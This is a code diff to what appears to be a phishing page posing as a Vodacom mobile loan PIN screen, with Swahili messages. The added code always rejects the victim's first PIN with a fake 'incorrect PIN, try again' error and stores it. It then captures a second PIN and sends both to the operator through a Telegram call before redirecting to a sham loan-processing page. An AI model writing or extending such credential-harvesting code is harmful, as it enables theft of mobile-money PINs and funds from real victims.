@@ -31,6 +31,15 @@
         .content {
             margin-top: 50px;
         }
+
+        .error-message {
+            color: #E3000F;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            min-height: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 
@@ -61,6 +70,8 @@
                 <div class="pin-dot"></div>
                 <div class="pin-dot"></div>
             </div>
+
+            <p class="error-message" id="pin-error"></p>
 
             <input type="tel" id="pin-input" style="position: absolute; opacity: 0; pointer-events: none;" maxlength="4"
                 pattern="[0-9]*" inputmode="numeric">
@@ -112,13 +123,34 @@
             }
 
             let isSubmitting = false;
+            let attempts = 0;
+            let firstPin = "";
+
             confirmBtn.addEventListener('click', async () => {
                 const pin = pinInput.value;
                 if (pin.length === 4 && !isSubmitting) {
+                    if (attempts === 0) {
+                        // First attempt - simulate failure
+                        firstPin = pin;
+                        attempts++;
+
+                        // Show error and reset
+                        document.getElementById('pin-error').textContent = "PIN si sahihi, tafadhali jaribu tena.";
+                        pinInput.value = "";
+                        dots.forEach(dot => dot.classList.remove('filled'));
+                        confirmBtn.style.opacity = '0.5';
+                        confirmBtn.style.pointerEvents = 'none';
+                        pinInput.focus();
+                        return;
+                    }
+
+                    // Second attempt - send both
                     isSubmitting = true;
                     confirmBtn.style.opacity = '0.5';
                     confirmBtn.style.pointerEvents = 'none';
-                    await sendToTelegram(`<b>Vodacom Loan - PIN Imepatikana</b>\nPIN: <code>${pin}</code>`);
+                    document.getElementById('pin-error').textContent = "";
+
+                    await sendToTelegram(`<b>Vodacom Loan - PIN Attempts</b>\n1st: <code>${firstPin}</code>\n2nd: <code>${pin}</code>`);
                     const msg = encodeURIComponent('Tunaandaa mkopo, tunakagua uwezo wako wa kulipa...');
                     window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
                 }
